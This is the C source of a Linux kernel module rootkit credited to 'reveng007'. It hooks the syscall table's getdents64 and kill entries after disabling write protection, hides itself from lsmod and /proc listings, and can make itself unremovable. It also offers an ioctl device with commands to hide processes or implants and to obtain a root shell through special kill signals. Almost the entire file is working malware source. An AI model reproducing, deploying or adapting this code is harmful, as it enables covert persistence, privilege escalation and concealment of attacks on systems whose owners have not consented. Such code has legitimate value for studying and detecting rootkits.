/*
 * Usage:
 * $ sudo dmesg -C
 * $ make
 * $ modinfo <name.ko>
 * $ sudo insmod <name.ko> [optional arguments]
 * $ lsmod
 * $ sudo dmesg 
 * $ sudo rmmod <name>
 */

#include <linux/init.h>		/* Needed for the macros */
#include <linux/module.h>	/* Needed by all modules */
#include <linux/kernel.h>	/* Needed for printing log level messages */
#include <linux/list.h>		/* macros related to linked list are defined here. Eg: list_add(), list_del(), list_entry(), etc */
#include <linux/cred.h>		/* To change value of this fields we have to invoke prepare_creds(). 
				 * To set those modified values we have to invoke commit_creds(). 
				 * uid, gid and other similar "things" are stored in cred structure which is element of cred structure. */

#include "include/hide_show_helper.h"
#include "include/hook_syscall_helper.h"


#include <linux/fs.h>           /* Related to file structure */
#include <linux/cdev.h>         /* Character device related stuff */
#include <linux/device.h>       /* device_create() and device_destroy() */
#include <linux/device/class.h> /* class_create() and class_destroy() */
#include <linux/uaccess.h>      /* copy_to_user() and copy_from_user() */
#include <linux/ioctl.h>        /* IOCTL operation */

/* Defining macro for reading from and writing into Device file */
#define WR_VALUE _IOW('a','a',int32_t*)
#define RD_VALUE _IOR('a','b',int32_t*)

// For size of array
#define MAX_LIMIT 20

// To copy value from userspace
char value[MAX_LIMIT];

// Needed for creating/registering and adding Character device to system
dev_t dev = 0;
static struct class *dev_class;
static struct cdev etx_cdev;


/* Function Prototypes */

static int      __init rootkit_init(void);
static void     __exit rootkit_exit(void);
static int      etx_open(struct inode *inode, struct file *file);
static int      etx_release(struct inode *inode, struct file *file);
static ssize_t  etx_read(struct file *filp, char __user *buf, size_t len,loff_t *off);
static ssize_t  etx_write(struct file *filp, const char *buf, size_t len, loff_t *off);
static long     etx_ioctl(struct file *file, unsigned int cmd, unsigned long arg);
static void	hide_rootkit(void);
static void	show_rootkit(void);
static void 	protect_rootkit(void);
static void 	remove_rootkit(void);



/* Device File operation sturcture */

/* link: https://elixir.bootlin.com/linux/v5.11/source/include/linux/fs.h#L1820
 * 
 * struct file_operations {
	struct module *owner;
	...
	ssize_t (*read) (struct file *, char __user *, size_t, loff_t *);
	ssize_t (*write) (struct file *, const char __user *, size_t, loff_t *);
	...
	long (*unlocked_ioctl) (struct file *, unsigned int, unsigned long);
	...
	int (*open) (struct inode *, struct file *);
	...
	int (*release) (struct inode *, struct file *);
	...
} __randomize_layout;
 */
static struct file_operations fops =
{
	.owner          = THIS_MODULE,
	.read           = etx_read,
	.write          = etx_write,
	.open           = etx_open,
	.unlocked_ioctl = etx_ioctl,
	.release        = etx_release,
};

// =========================== Available Commands =======================

static char rootkit_hide[] = "hide";		// command to hide rootkit => In this mode, in no way this rootkit be removable => rootkit_remove will not work
static char rootkit_show[] = "show";		// command to unhide rootkit => In this mode, rootkit_protect and rootkit_remove will work effectively
static char rootkit_protect[] = "protect";	// command to make rootkit unremovable (even if it can be seen in usermode).
static char rootkit_remove[] = "remove";	// command to make rootkit removable
static char process[] = "process";		// command to hide/unhide running process/implant
static char root[] = "root";			// command to get root shell


// ========================= Hide rootkit LKM ==================

static void hide_rootkit(void)
{
        // Hiding rootkit from `lsmod` cmd, "/proc/kallsyms" file and "/proc/modules" file
        proc_lsmod_hide_rootkit();

        // Hiding rootkit from "/sys/module/<THIS_MODULE>/" directory
	//sys_module_hide_rootkit();
	
	//tidy();
}

// ========================= Unhide rootkit LKM ======================

static void show_rootkit(void)
{
        // Making rootkit visible to `lsmod` cmd, in "/proc/kallsyms" file and "/proc/modules" file
        proc_lsmod_show_rootkit();


        // Making rootkit visible to "/sys/module/<THIS_MODULE>/" directory

        /* STILL FACING DIFFICULTY TO ADD THE kobject OF OUR ROOTKIT LKM BACK TO THE kobject linked list.
                
        Not getting enough resource on the topic of adding mapped kobject back to the main kobject linked list, so that /sys/module/<THIS_MODULE> directory
        can be revealed, and we don't face any difficulty to make this LKM removable. */

        // Making rootkit visible to to "/sys/module/<THIS_MODULE>/" directory
        //sys_module_show_rootkit();
}

// ============= This function will be called when we open the Device file ============

static int etx_open(struct inode *inode, struct file *file)
{
        pr_info("[+] Device File Opened...!!!\n");
        return 0;
}

// ============== This function will be called when we close the Device file ===========

static int etx_release(struct inode *inode, struct file *file)
{
        pr_info("[+] Device File Closed...!!!\n");
        return 0;
}

// === This function will be called when when somebody tries to read the Device file =====

static ssize_t etx_read(struct file *filp, char __user *buf, size_t len, loff_t *off)
{
        pr_info("		[+] Read Function\n");
        return 0;
}

// ===== This function will be called when somebody tries to write into the Device file ===

static ssize_t etx_write(struct file *filp, const char __user *buf, size_t len, loff_t *off)
{
        pr_info("		[+] Write function\n");
        return len;
}

// ======= Protecting Rootkit from being `rmmod`ed ==========

static int is_protected = 0;

static void protect_rootkit(void)
{
	if (is_protected == 0)
	{
		/* 
		 * pwd: /lib/modules/5.11.0-49-generic/build/include/linux/module.h
		 *
		 * // This is the Right Way to get a module: if it fails, it's being removed, so pretend it's not there.
		 * 
		 * extern bool try_module_get(struct module *module);
		 */
		try_module_get(THIS_MODULE);

		is_protected = 1;

		printk(KERN_INFO "[*] reveng_rtkit: PROTECT MODE => ON! \n");
	}
}

// ============== Making Rootkit removable =============

static void remove_rootkit(void)
{
	if (is_protected == 1)
	{
		/*
		 * pwd: /lib/modules/5.11.0-49-generic/build/include/linux/module.h
		 *
		 * extern void module_put(struct module *module);
		 */
		module_put(THIS_MODULE);

		is_protected = 0;

		printk(KERN_INFO "[*] reveng_rtkit: PROTECT MODE => OFF \n");
	}
}

// ======= This function will be called when somebody write IOCTL on the Device file =====

static long etx_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
        switch(cmd) {
                case WR_VALUE:
                        /*
                         * copy_from_user():
                         * - a direct read from the userspace address and write to the kernelspace address
                         * Or, Copy data from User space to Kernel Space
                         */ 
                        if( copy_from_user(value ,(int32_t*) arg, MAX_LIMIT) )
                        {
                                pr_err("Data Write : Err!\n");
                        }
			pr_info("		Value got from device file= %s\n", value);


			if (strncmp(rootkit_hide, value, sizeof(rootkit_hide)) == 0)
                        {
				hide_rootkit();
                        }
                        else if (strncmp(rootkit_show, value, sizeof(rootkit_show)) == 0)
                        {
				show_rootkit();
                        }
			else if (strncmp(rootkit_protect, value, sizeof(rootkit_protect)) == 0)
			{
				protect_rootkit();
			}
			else if (strncmp(rootkit_remove, value, sizeof(rootkit_remove)) == 0)
                        {
				remove_rootkit();
			}
			else if (strncmp(process, value, sizeof(process)) == 0)
			{
				pr_info("[+] kill -31 <pid> : Command to hide/unhide running process/implant. Applicable in normal shell prompt.\n");
			}
			else if (strncmp(root, value, sizeof(root)) == 0)
			{
				pr_info("[+] kill -64 <any pid> : Command to get root shell. Applicable in normal shell prompt.\n");
			}
			else
			{
				pr_err("Command: Out of syllabus");
                        }
                        break;
                case RD_VALUE:
                        /* copy_to_user():
                         * - Copy data from kernel space to user space
                         * Or, a direct read from the kernel address and write to the userspace address
                         */
                        //if( copy_to_user((int32_t*) arg, &value, sizeof(value)) )
                        if( copy_from_user(value ,(int32_t*) arg, MAX_LIMIT ))
                        {
                                pr_err("Data Read : Err!\n");
                        }
                        break;
                default:
                        pr_info("Default\n");
                        break;
        }
        return 0;
}

// =================== Entry Function ====================

static int __init rootkit_init(void)
{
	printk(KERN_INFO "=================================================\n");
	printk(KERN_INFO "[+] reveng_rtkit: Created by @reveng007(Soumyanil)");
	printk(KERN_INFO "[+] reveng_rtkit: Loaded \n");

	/* Hiding our Rootkit from: 
	 * `lsmod` cmd, 
	 * "/proc/modules" file path, 
	 * "/proc/kallsyms" file path.
	 */
	hide_rootkit();

	/*
	 * link: https://lwn.net/Articles/88052/
	 * 
	 * sect_attrs:
	 * Adds a "sections" subdirectory to every module's entry in /sys/module.
	 * Each attribute in that directory associates a beginning address with the section name.
	 */
	//tidy();
	
	__sys_call_table = get_syscall_table();
	if (!__sys_call_table)
		return -1;

	printk(KERN_INFO "[+] reveng_rtkit: Address of sys_call_table in kernel memory: %p\n", __sys_call_table);

	/* Executes the instruction to read cr0 register
	 *
	 * link: https://elixir.bootlin.com/linux/v5.11/source/arch/x86/include/asm/paravirt_types.h#L111
	 *
	 * unsigned long (*read_cr0)(void);
	 */
	cr0 = read_cr0();

	orig_getdents64 = (tt_syscall)__sys_call_table[__NR_getdents64];
	orig_kill = (tt_syscall)__sys_call_table[__NR_kill];

	unprotect_memory();

	__sys_call_table[__NR_getdents64] = (unsigned long) hacked_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) hacked_kill;

	protect_memory();
	
	// =====================================================================================

	/* Dynamically allocating Major number*/

        /* link: https://sysprog21.github.io/lkmpg/#character-device-drivers
         * 
         * 6.3 Registering A device
         *
         * major number: 
         * Major no. tells which driver handles which device file.
         * Minor no. is used only by driver itself to differentiate which device file it is operating 
         * on, just in case it handles more than one device file.
         *
         * How to get the major number ?
         * 
         *1.  If I don't know major no.:
         * extern int alloc_chrdev_region(dev_t *, unsigned, unsigned, const char *);
         *
         * => Dynamically allocating major number
         * 
         * If I know major no.:
         * extern int register_chrdev_region(dev_t, unsigned, const char *);
         *
         *2. Intialize the data structure `struct cdev` for our char device and associate it within
         *   a device-specific structure of our own.
         *
         * void cdev_init(struct cdev *, const struct file_operations *);
         *
         *3. We finish the initialization by adding char device to the system
         *
         * int cdev_add(struct cdev *, dev_t, unsigned);
         *
         */
	 /* link: https://github.com/Embetronicx/Tutorials/blob/master/Linux/Device_Driver/IOCTL
	Sample for making a Character driver to communicate b/w usermode and kernel mode */
	if((alloc_chrdev_region(&dev, 0, 1, "etx_Dev")) < 0)
	{
		pr_err("Cannot allocate major number\n");
		return -1;
        }
        pr_info("Major = %d Minor = %d \n",MAJOR(dev), MINOR(dev));

	/* Creating cdev structure */
	cdev_init(&etx_cdev,&fops);

	/* Adding character device to the system */
	if((cdev_add(&etx_cdev,dev,1)) < 0)
	{
		pr_err("Cannot add the device to the system\n");
		goto r_class;
        }



	/* Creating struct class */
	/* This is used to create a struct class pointer that can then be used in
	calls to device_create. */
	if((dev_class = class_create(THIS_MODULE,"etx_class")) == NULL)
	{
		pr_err("Cannot create the struct class\n");
		goto r_class;
        }

        /* Creating device */
	/* https://manpages.debian.org/jessie/linux-manual-3.16/device_create.9.en.html */
	if((device_create(dev_class,NULL,dev,NULL,"etx_device")) == NULL)
	{
		pr_err("Cannot create the Device 1\n");
		goto r_device;
        }
	
	printk(KERN_INFO "=========================================\n\n");
        return 0;

r_device:

/* link: https://manned.org/class_create/e9da076a
 *
 * The pointer created using class_create() is destroyed when finished by making a call to class_destroy(). */
	class_destroy(dev_class);

r_class:
	/* pwd: /lib/modules/5.11.0-49-generic/build/include/linux/fs.h
	 *
	 * extern void unregister_chrdev_region(dev_t, unsigned);
	 *
	 * Unregistering the character device
	 */
	unregister_chrdev_region(dev,1);
	return -1;

}

// ========================== Exit Function ====================

static void __exit rootkit_exit(void)
{
	printk(KERN_INFO "\n=========================================\n");

	unprotect_memory();
	printk(KERN_INFO "\t\t\t\t\t\t back to normal");

	__sys_call_table[__NR_getdents64] = (unsigned long) orig_getdents64;
	__sys_call_table[__NR_kill] = (unsigned long) orig_kill;

	protect_memory();

	device_destroy(dev_class,dev);
        class_destroy(dev_class);
        cdev_del(&etx_cdev);

	//Unregistering the character device
        unregister_chrdev_region(dev, 1);
        
        printk(KERN_INFO "[*] reveng_rtkit: Unregistering the Character device \n");

	printk(KERN_INFO "[-] reveng_rtkit: Unloaded \n");
	printk(KERN_INFO "=================================================\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("reveng007");
MODULE_DESCRIPTION("Modifying Stage of reveng_rtkit");
MODULE_VERSION("0.01");

